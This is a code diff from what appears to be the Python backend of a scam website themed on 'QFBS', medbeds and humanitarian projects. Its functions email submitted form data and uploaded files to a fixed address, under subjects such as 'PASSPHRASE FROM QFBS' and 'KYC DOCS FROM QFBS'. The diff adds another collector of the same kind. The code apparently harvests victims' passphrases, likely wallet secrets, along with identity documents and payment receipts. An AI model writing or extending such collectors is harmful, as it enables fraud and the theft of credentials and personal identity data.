@@ -21,25 +21,28 @@ def greet():
     else:
         return"evening"
     
-
 def send_data(data):
 
     converted_data = {key: str(value) for key, value in data.items()}
     
     return send_mail(EMAIL_ADDRESS,json.dumps(converted_data),f'PASSPHRASE FROM QFBS')
     
-
 def send_kyc(request):
     data = request.form
     converted_data = {key: str(value) for key, value in data.items()}
     print('SENDING KYC')
     return send_mail(EMAIL_ADDRESS,json.dumps(converted_data),'KYC DOCS FROM QFBS', file=request.files)
 
+def humanitarian_project(request):
+    data = request.form
+    converted_data = {key: str(value) for key, value in data.items()}
+    print('SENDING humanitarian_project')
+    return send_mail(EMAIL_ADDRESS,json.dumps(converted_data),'humanitarian_project DOCS FROM QFBS', file=request.files)
 
 def send_medbed(request):
     data = request.form
     converted_data = {key: str(value) for key, value in data.items()}
-    print('SENDING Payment')
+    print('SENDING Medbed')
     return send_mail(EMAIL_ADDRESS,json.dumps(converted_data),'MEDBED Payment Receipt', file=request.files)
 
 
